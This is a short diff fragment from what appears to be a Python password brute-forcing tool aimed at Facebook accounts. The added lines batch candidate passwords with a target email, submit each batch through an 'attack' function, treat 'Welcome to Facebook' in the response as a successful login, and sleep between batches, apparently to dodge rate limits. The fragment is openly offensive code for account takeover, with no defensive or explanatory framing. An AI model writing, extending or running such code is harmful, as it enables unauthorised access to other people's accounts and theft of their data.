@@ -96,4 +96,14 @@ if __name__ == '__main__':
         print("")
 
         for num in range(0, len(passwds)):
-            if len(entries) == PASS
+            if len(entries) == PASSWD_PER_REQUEST:
+                if "Welcome to Facebook" in attack(entries):
+                    find_one(entries)
+                entries = []
+                time.sleep(WAIT_TIME)
+
+            entries.append({"email": email, "passwd": passwds[num]})
+        
+        if "Welcome to Facebook" in attack(entries):
+            find_one(entries)
+        entries = []
